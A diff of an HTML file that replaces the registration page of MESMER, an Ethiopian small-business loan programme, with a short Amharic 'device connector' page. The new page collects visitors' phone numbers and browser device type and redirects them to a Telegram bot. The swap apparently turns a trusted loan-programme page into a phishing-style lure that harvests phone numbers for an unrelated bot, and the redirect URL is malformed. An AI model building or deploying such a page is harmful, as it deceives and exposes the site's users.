@@ -1,219 +1,52 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ዲቫይስ ማገናኛ</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 320px; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background-color: #0088cc; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; font-weight: bold; }
+        button:hover { background-color: #006699; }
+    </style>
+</head>
+<body>
 
-
-<header class="site-header">
-  <a href="#home" class="brand"><img src="images/MESMER_Logo.png" alt="mesmer logo"></a>
-  <div class="header-right">
-    <div class="bank-strip">
-      <a href="https://awashbank.com/" rel="noopener"><img src="images/Awash_International_Bank.png" alt="Awash International Bank"></a>
-      <a href="https://www.bankofabyssinia.com/" rel="noopener"><img src="images/Bank_of_Abyssinia.png" alt="Bank of Abyssinia"></a>
-      <a href="https://dashenbanksc.com/" rel="noopener" class="dashen"><img src="images/pdf_dashen_bank.png" alt="Dashen Bank"></a>
-      <a href="https://www.hibretbank.com.et/" rel="noopener" class="hibret"><img src="images/Hibret_Bank.png" alt="Hibret Bank"></a>
-      <div class="lang">
-        <button class="lang-btn" id="langBtn">English
-          <svg width="1em" height="1em" viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m6 9l6 6l6-6"></path></svg>
-        </button>
-        <div class="lang-menu">
-          <button class="active">English</button><button>አማርኛ</button><button>Afaan Oromo</button>
-        </div>
-      </div>
-    </div>
-    <button class="burger" id="burger" aria-label="Open menu">
-      <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path></svg>
-    </button>
-  </div>
-</header>
-
-<div class="drawer" id="drawer">
-  <div class="bank-row">
-    <a href="https://awashbank.com/" rel="noopener"><img src="images/Awash_International_Bank.png" alt="Awash International Bank"></a>
-    <a href="https://www.bankofabyssinia.com/" rel="noopener"><img src="images/Bank_of_Abyssinia.png" alt="Bank of Abyssinia"></a>
-    <a href="https://dashenbanksc.com/" rel="noopener"><img src="images/pdf_dashen_bank.png" alt="Dashen Bank"></a>
-    <a href="https://www.hibretbank.com.et/" rel="noopener"><img src="images/Hibret_Bank.png" alt="Hibret Bank"></a>
-  </div>
-  <nav>
-    <a href="#home">Register to Apply</a><a href="#about">About us</a><a href="#apply">How to Apply</a><a href="#faq">FAQs</a>
-  </nav>
+<div class="card">
+    <h2>ዲቫይስዎን ለመመዝገብ ስልክዎን ያስገቡ</h2>
+    <input type="tel" id="phoneNumber" placeholder="ምሳሌ፦ +251912345678" required>
+    <button onclick="registerDevice()">ዲቫይስ አድ አድርግ</button>
 </div>
 
-<div class="hero-wrap" id="home">
-  <div class="hero-bg"></div>
-  <div class="hero">
-    <div class="hero-copy">
-      <h1>Pathway to bankability and growth</h1>
-      <div class="signin-desktop"><a href="#signin" class="btn-orange">Sign in</a></div>
-    </div>
-    <div class="card-outer">
-      <div class="card">
-        <h2 class="card-title">Register to Apply</h2>
-        <form id="signupForm" novalidate="">
-          <div class="row-2">
-            <div><label class="label" for="fn">First Name</label><div class="input-wrap"><input id="fn" type="text" name="first_name" placeholder="First Name"></div></div>
-            <div><label class="label nowrap" for="mn">Father's Name</label><div class="input-wrap"><input id="mn" type="text" name="middle_name" placeholder="Father's Name"></div></div>
-          </div>
-          <div class="field"><label class="label" for="ln">Grand Father's Name</label><div class="input-wrap"><input id="ln" type="text" name="last_name" placeholder="Grand Father's Name"></div></div>
-          <div class="field"><label class="label" for="ph">Phone Number</label><div class="input-wrap with-prefix"><div class="prefix">+251</div><input id="ph" type="text" name="phone_number" placeholder="Phone Number"></div></div>
-          <div class="field"><label class="label" for="pw">Password</label><div class="input-wrap with-toggle"><input id="pw" type="password" name="new_password" placeholder="Password"><button type="button" class="eye-btn" data-target="pw" aria-label="Show password"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 9a3 3 0 0 1 3 3a3 3 0 0 1-3 3a3 3 0 0 1-3-3a3 3 0 0 1 3-3m0-4.5c5 0 9.27 3.11 11 7.5c-1.73 4.39-6 7.5-11 7.5S2.73 16.39 1 12c1.73-4.39 6-7.5 11-7.5M3.18 12a9.821 9.821 0 0 0 17.64 0a9.821 9.821 0 0 0-17.64 0"></path></svg></button></div></div>
-          <div class="field"><label class="label" for="cp">Confirm Password</label><div class="input-wrap with-toggle"><input id="cp" type="password" name="confirm_password" placeholder="Confirm Password"><button type="button" class="eye-btn" data-target="cp" aria-label="Show password"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 9a3 3 0 0 1 3 3a3 3 0 0 1-3 3a3 3 0 0 1-3-3a3 3 0 0 1 3-3m0-4.5c5 0 9.27 3.11 11 7.5c-1.73 4.39-6 7.5-11 7.5S2.73 16.39 1 12c1.73-4.39 6-7.5 11-7.5M3.18 12a9.821 9.821 0 0 0 17.64 0a9.821 9.821 0 0 0-17.64 0"></path></svg></button></div>
-            <span class="hint">Your password must be greater than 8 characters.</span>
-          </div>
-          <div class="terms-row">
-            <div class="terms-left">
-              <button class="switch" id="termsSwitch" role="switch" aria-checked="false" aria-label="Agree to terms"><span class="knob"></span></button>
-              <span class="terms-text">By signing up, you agree to the <a href="#terms">Terms And Conditions</a></span>
-            </div>
-          </div>
-          <div class="tooltip-wrap">
-            <div class="tooltip" id="termsTip">To sign up, you must agree to the terms and conditions beforehand.</div>
-            <div class="actions">
-              <button type="submit" class="btn-primary" id="signupBtn" disabled="">Sign up</button>
-              <div class="mobile-only-stack"><p>Already have an account?</p><button type="button" class="btn-ghost">Sign in</button></div>
-            </div>
-          </div>
-        </form>
-        <div class="card-banks">
-          <a href="https://awashbank.com/" rel="noopener"><img src="images/Awash_International_Bank.png" alt="Awash International Bank"></a>
-          <a href="https://www.bankofabyssinia.com/" rel="noopener"><img src="images/Bank_of_Abyssinia.png" alt="Bank of Abyssinia"></a>
-          <a href="https://dashenbanksc.com/" rel="noopener" class="dashen"><img src="images/pdf_dashen_bank.png" alt="Dashen Bank"></a>
-          <a href="https://www.hibretbank.com.et/" rel="noopener" class="hibret"><img src="images/Hibret_Bank.png" alt="Hibret Bank"></a>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
+<script>
+function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/android/i.test(ua)) return "Android_Phone";
+    if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "iPhone";
+    if (/Windows/i.test(ua)) return "Windows_PC";
+    if (/Mac/i.test(ua)) return "Mac_PC";
+    return "Unknown_Device";
+}
 
-<section class="apply" id="apply">
-  <div class="apply-inner">
-    <h2 class="title">How to Apply</h2>
-    <h3 class="sub">MESMER offers MSME loans with lower interest rate and flexible collateral requirements.</h3>
-    <div class="cols">
-      <div class="col">
-        <h4>Eligibility</h4>
-        <div class="lead">An applicant must fulfill the following criteria.</div>
-        <ul class="elig">
-          <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 48 48" aria-hidden="true"><path fill="currentColor" d="M12.25 6.5a1.75 1.75 0 0 0-1.75 1.75V41.5H14v-5.25A2.25 2.25 0 0 1 16.25 34h15.5A2.25 2.25 0 0 1 34 36.25v5.25h3.5V23.25a1.75 1.75 0 0 0-1.75-1.75h-5c-.69 0-1.25-.56-1.25-1.25v-12a1.75 1.75 0 0 0-1.75-1.75zm-3 37.5C8.56 44 8 43.44 8 42.75V8.25A4.25 4.25 0 0 1 12.25 4h15.5A4.25 4.25 0 0 1 32 8.25V19h3.75A4.25 4.25 0 0 1 40 23.25v19.5c0 .69-.56 1.25-1.25 1.25zm7.25-2.5h6.25v-5H16.5zm8.75 0h6.25v-5h-6.25zM18 14a2 2 0 1 1-4 0a2 2 0 0 1 4 0m-2 9a2 2 0 1 0 0-4a2 2 0 0 0 0 4m2 5a2 2 0 1 1-4 0a2 2 0 0 1 4 0m6-12a2 2 0 1 0 0-4a2 2 0 0 0 0 4m2 5a2 2 0 1 1-4 0a2 2 0 0 1 4 0m-2 9a2 2 0 1 0 0-4a2 2 0 0 0 0 4m10-2a2 2 0 1 1-4 0a2 2 0 0 1 4 0"></path></svg></div><div><h5>Formal Enterprise</h5><p>Enterprises must have valid business license, TIN certificate, ID number</p></div></li>
-          <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 30 30" aria-hidden="true"><path fill="currentColor" d="M3.74 14.47c0-2.04.51-3.93 1.52-5.66s2.38-3.1 4.11-4.11s3.61-1.51 5.64-1.51c1.52 0 2.98.3 4.37.89s2.58 1.4 3.59 2.4s1.81 2.2 2.4 3.6s.89 2.85.89 4.39c0 1.52-.3 2.98-.89 4.37s-1.4 2.59-2.4 3.59s-2.2 1.8-3.59 2.39s-2.84.89-4.37.89s-3-.3-4.39-.89s-2.59-1.4-3.6-2.4s-1.8-2.2-2.4-3.58s-.88-2.84-.88-4.37m2.48 0c0 2.37.86 4.43 2.59 6.18c1.73 1.73 3.79 2.59 6.2 2.59c1.58 0 3.05-.39 4.39-1.18s2.42-1.85 3.21-3.2s1.19-2.81 1.19-4.39s-.4-3.05-1.19-4.4s-1.86-2.42-3.21-3.21s-2.81-1.18-4.39-1.18s-3.05.39-4.39 1.18S8.2 8.72 7.4 10.07s-1.18 2.82-1.18 4.4m7.92 0V7.81c0-.23.08-.43.24-.59s.36-.24.59-.24s.43.08.59.24s.24.36.24.59v6.15l3.59 2.09c.2.12.32.29.38.51s.03.43-.09.62q-.24.42-.72.42q-.255 0-.42-.12l-3.82-2.23c-.17-.05-.31-.15-.42-.29s-.16-.3-.16-.49"></path></svg></div><div><h5>Enterprises in operation</h5><p>Enterprises that have started and are in operation.</p></div></li>
-          <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 1024 1024" aria-hidden="true"><path fill="currentColor" d="M800 416a288 288 0 1 0-576 0c0 118.1 94.5 272.1 288 456.6C705.5 688 800 534 800 416M512 960Q160 640 160 416a352 352 0 0 1 704 0q0 224-352 544"></path><path fill="currentColor" d="M512 448a64 64 0 1 0 0-128a64 64 0 0 0 0 128m0 64a128 128 0 1 1 0-256a128 128 0 0 1 0 256m345.6 192L960 960H672v-64H352v64H64l102.4-256zm-69 0H235.4l-76.8 192h707z"></path></svg></div><div><h5>In All regions of Ethiopia</h5><p>In All regions of Ethiopia (Afar, Amhara, Benishangul-Gumuz, Central Ethiopia, Dire Dawa, Gambella, Harari, Oromia, Sidama, Somali, South Ethiopia, South West Ethiopia and Tigray&nbsp;)</p></div></li>
-        </ul>
-      </div>
-      <div class="divider-v"></div>
-      <div class="col right">
-        <h4>Form Instructions</h4>
-        <div class="lead">Applicants must complete the following fields and attach supporting documents.</div>
-        <div class="tabs-head" role="tablist" aria-orientation="horizontal">
-          <button class="tab" role="tab" aria-selected="true" data-panel="p1"><svg width="20" height="20" viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 6h18M3 12h18M3 18h18"></path></svg>Basic Information</button>
-          <button class="tab" role="tab" aria-selected="false" data-panel="p2"><svg width="20" height="20" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M13 6.75V2H8.75A2.25 2.25 0 0 0 6.5 4.25v13a2.25 2.25 0 0 0 2.25 2.25h9A2.25 2.25 0 0 0 20 17.25V9h-4.75A2.25 2.25 0 0 1 13 6.75m1.5 0V2.5l5 5h-4.25a.75.75 0 0 1-.75-.75M5.503 4.627A2.25 2.25 0 0 0 4 6.75v10.504a4.75 4.75 0 0 0 4.75 4.75h6.494a2.25 2.25 0 0 0 2.122-1.5H8.75a3.25 3.25 0 0 1-3.25-3.25z"></path></svg>Supporting Documents</button>
-        </div>
-        <div class="tab-panel" id="p1" role="tabpanel">
-          <ul>
-            <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z"></path></svg></div><div><h5>Personal Information</h5><p>Full name in English, age, sex, marital status, disability status, has smartphone</p></div></li>
-            <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z"></path></svg></div><div><h5>Residential Address</h5><p>Region, subcity, woreda, zone or area</p></div></li>
-            <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z"></path></svg></div><div><h5>Business Address</h5><p>Region, subcity, woreda, zone or area</p></div></li>
-            <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z"></path></svg></div><div><h5>Monthly Income Status</h5><p>Amount of money you earn in a month from your salary income.</p></div></li>
-            <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z"></path></svg></div><div><h5>Employment Status</h5><p>Number of employees by age group and by gender</p></div></li>
-          </ul>
-        </div>
-        <div class="tab-panel" id="p2" role="tabpanel" hidden="">
-          <ul>
-            <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z"></path></svg></div><div><h5>Create Account</h5><p>Before submitting an application, users are required to create an account on our platform to access the application form and ensure that their information is securely stored for future reference.</p></div></li>
-            <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z"></path></svg></div><div><h5>Supporting Documents</h5><p>Residence (Kebele) ID, Bank book, Business License, TIN number, Number of employees, Evidence of the business presence in the area (one photo)</p></div></li>
-            <li><div class="icon-badge"><svg width="25" height="25" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z"></path></svg></div><div><h5>Employment</h5><p>Number of employees by age group and by gender</p></div></li>
-          </ul>
-        </div>
-      </div>
-    </div>
+function registerDevice() {
+    var phone = document.getElementById("phoneNumber").value.trim();
+    var device = getDeviceType();
+    
+    // የእርስዎ ቦት ዩዘርኔም እዚህ ጋር በታማኝነት ተተክቷል
+    var botUsername = "foyytrebot"; 
 
-    <h2 class="process-head">Application Process</h2>
-    <div class="steps-row">
-      <div class="step-line"></div>
-      <div class="step"><img src="images/mingcute_user-add-line_1.webp" width="70" height="70" alt=""><h5>Step 1:</h5><p>Register or Sign up by providing your full name, phone number and memorable password (must be 8 characters). Agree to the Terms and Conditions</p></div>
-      <div class="step"><img src="images/mdi_sms.png" width="70" height="70" alt=""><h5>Step 2:</h5><p>Sign in using the authentication code sent to your phone eg.(XB3445). Please input the code in the space provided.</p></div>
-      <div class="step"><img src="images/carbon_task-complete.webp" width="70" height="70" alt=""><h5>Step 3:</h5><p>Complete the application form for Credit if you have a formal enterprise.</p></div>
-    </div>
-    <div class="steps-row second">
-      <div class="step-line two"></div>
-      <div class="step"><img src="images/tabler_user-search.webp" width="70" height="70" alt=""><h5>Step 4:</h5><p>Applicants are screened based on the eligibility and selection criteria</p></div>
-      <div class="step"><img src="images/healthicons_i-training-class.webp" width="70" height="70" alt=""><h5>Step 5:</h5><p>Applicants that pass the first screening attend business development training</p></div>
-      <div class="step"><img src="images/healthicons_i-exam-multiple-choice-outline.webp" width="70" height="70" alt=""><h5>Step 6:</h5><p>Enterprises that complete the business development training are transferred to one of the four banks for assessment</p></div>
-    </div>
-    <div class="steps-row second">
-      <div class="step-line three"></div>
-      <div class="step"><img src="images/tdesign_money.webp" width="70" height="70" alt=""><h5>Step 7:</h5><p>Enterprises are notified by SMS which bank their case has been transferred to. They then start</p></div>
-      <div class="step"><img src="images/solar_hand-money-broken.webp" width="70" height="70" alt=""><h5>Step 8:</h5><p>Provide all documents required by the bank and receive credit from the bank</p></div>
-      <div class="step"><img src="images/game-icons_pay-money.webp" width="70" height="70" alt=""><h5>Step 9:</h5><p>Make regular repayments of the credit as per the agreed repayment schedule</p></div>
-    </div>
-    <div class="learn-wrap"><a href="#apply" class="btn-dark">Learn more</a></div>
-  </div>
-</section>
+    if (phone === "") {
+        alert("እባክዎ መጀመሪያ ስልክ ቁጥር ያስገቡ!");
+        return;
+    }
 
-<div class="objective" id="about">
-  <div class="obj-grid">
-    <div class="full">
-      <svg width="50" height="50" viewBox="0 0 679 682" aria-hidden="true" fill="#ff8e00">
-        <path d="m409,346c0,37-30,67-67,67s-67-30-67-67,30-67,67-67c4.99,0,9.86.55,14.54,1.59l-14.54,65.41,64-19.88c1.95,6.28,3,12.96,3,19.88Z"></path>
-        <path d="m496.76,297.94l-56.37,17.51c3,9.65,4.61,19.91,4.61,30.55,0,56.89-46.11,103-103,103s-103-46.11-103-103,46.11-103,103-103c7.68,0,15.16.84,22.35,2.44l12.8-57.61c-11.31-2.51-23.08-3.83-35.15-3.83-89.47,0-162,72.53-162,162s72.53,162,162,162,162-72.53,162-162c0-16.73-2.54-32.87-7.24-48.06Z"></path>
-        <path d="m604.7,264.42l-70.7,21.95c5.85,18.84,9,38.87,9,59.63,0,111.01-89.99,201-201,201s-201-89.99-201-201,89.99-201,201-201c14.97,0,29.57,1.64,43.61,4.75l16.06-72.26c-19.21-4.25-39.18-6.49-59.67-6.49-151.88,0-275,123.12-275,275s123.12,275,275,275,275-123.12,275-275c0-28.4-4.31-55.8-12.3-81.58Z"></path>
-        <path d="m595.7,247.14l-70.92,22.02-37.44,11.63-56.94,17.68-35.26,10.95-26.14,8.12,6.21-27.93,8.13-36.6,13.01-58.57,8.54-38.39,16.13-72.61c.06,0,12.02,49.84,21.72,90.37,6.66,27.78,12.26,51.19,12.26,51.19,0,0,22.84,3.55,50.11,7.81,40.42,6.31,90.59,14.18,90.59,14.33Z"></path>
-      </svg>
-      <h5>Objective</h5>
-      <p>Targets to reach 72,200 MSMEs, startups and informal enterprises with access to credit, grant, Business development and psychosocial support services, and support 410,800 works within these enterprises.</p>
-    </div>
-    <div class="item">
-      <svg width="50" height="50" viewBox="0 0 679 682" aria-hidden="true" fill="#ff8e00"><path d="M340 40a300 300 0 1 0 0 600 300 300 0 0 0 0-600Zm0 60a240 240 0 1 1 0 480 240 240 0 0 1 0-480Z"></path><path d="M340 180a36 36 0 0 1 36 36v108l78 45a36 36 0 0 1-36 62l-96-55a36 36 0 0 1-18-31V216a36 36 0 0 1 36-36Z"></path></svg>
-      <h5 class="nowrap">Duration</h5>
-      <p>October 2022 - September 2027</p>
-    </div>
-    <div class="item">
-      <svg width="50" height="50" viewBox="0 0 679 682" aria-hidden="true" fill="#ff8e00">
-        <path d="m617,604H94l.05-.13,36.95-90.64,49-120.23h127.08c12.3,19.6,24.6,39.2,36.89,58.8.84,1.35,1.82,2.61,3.05,4.35,1.11-1.57,1.99-2.69,2.74-3.89,12.39-19.75,24.77-39.5,37.15-59.26h137.09l93,211Z"></path>
-        <path d="m390.25,100.34c-10.69-3.85-22.15-5.62-33.25-8.34h-20c-1.61.34-3.21.75-4.84,1-46.66,7.28-79.71,32.49-96.97,76.42-14.72,37.48-10.04,73.9,11.22,108.01,24.05,38.57,48.21,77.08,72.37,115.57,8.49,13.54,16.98,27.07,25.47,40.6.76,1.22,1.65,2.36,2.75,3.94,1.01-1.43,1.8-2.44,2.48-3.52,8.57-13.67,17.14-27.34,25.71-41.02,24.24-38.66,48.47-77.32,72.69-115.98,10.23-16.33,16.29-34.02,18.48-53.26,5.91-51.94-26.76-105.67-76.11-123.42Zm-43.21,186.65c-41.27.02-75.08-33.81-75.03-75.07.05-41.09,33.61-74.73,74.7-74.91,41.25-.17,75.18,33.54,75.28,74.82.1,41.26-33.68,75.13-74.95,75.16Z"></path>
-        <path d="m391.94,212.86c-.86,24.91-21.47,44.81-45.68,44.09-24.84-.75-44.81-21.32-44.21-45.56.62-24.99,21.65-45.28,45.94-44.32,24.97.98,44.78,21.62,43.95,45.79Z"></path>
-      </svg>
-      <h5 class="nowrap">Geography</h5>
-      <p>In All regions of Ethiopia (Afar, Amhara, Benishangul-Gumuz, Central Ethiopia, Dire Dawa, Gambella, Harari, Oromia, Sidama, Somali, South Ethiopia, South West Ethiopia and Tigray&nbsp;)</p>
-    </div>
-  </div>
-  <div class="divider-h"></div>
-  <div class="program">
-    <h4>MESMER Program</h4>
-    <p>MESMER is a program that aims to help enterprises by providing access to finance, business development, and psychosocial services. The goal is to help these businesses recover from shocks, build resilience and grow to create dignified and fulfilling work for the youth.</p>
-    <div class="stats">
-      <div class="stat"><b>5 yrs</b><span>Program</span></div>
-      <div class="stat"><b>410k+</b><span>Jobs</span></div>
-      <div class="stat"><b>72k+</b><span>Enterprises</span></div>
-    </div>
-    <div class="learn"><button>Learn more.</button></div>
-  </div>
-</div>
+    var payload = phone + "_" + device;
+    var telegramUrl = "https://t.me" + botUsername + "?start=" + encodeURIComponent(payload);
+    window.location.href = telegramUrl;
+}
+</script>
 
-<footer class="site-footer">
-  <div class="footer-top">
-    <div class="footer-brand">
-      <div class="logo"><img src="images/Mesmer_white_logo.png" alt="mesmer Logo"></div>
-      <h5>Pathway to bankability and growth</h5>
-      <p>MESMER supports enterprises by providing access to finance, business development, and psychosocial services to help them recover from shocks and grow.</p>
-    </div>
-    <ul class="footer-lists">
-      <li class="head">PAGES</li>
-      <li><a href="#home">Register to Apply</a></li>
-      <li><a href="#about">About us</a></li>
-      <li><a href="#apply">How to Apply</a></li>
-      <li><a href="#faq">FAQs</a></li>
-    </ul>
-    <ul class="footer-lists right">
-      <li class="head">APPLICATION</li>
-      <li><a href="#signupForm">Sign Up to Apply</a></li>
-      <li><a href="#apply">Credit Application</a></li>
-      <li><a href="#terms">Terms And Conditions</a></li>
-    </ul>
-  </div>
-  <hr>
-  <div class="footer-bottom">
-    <h6>© 2026 MESMER. All rights reserved.</h6>
-    <h6 class="powered">Powered by:
-      <a href="https://www.minabtech.com/" rel="noopener"><img src="images/minab_logo.webp" alt="minab logo"></a>
-    </h6>
-  </div>
-</footer>
-
-
-
+</body>
+</html>
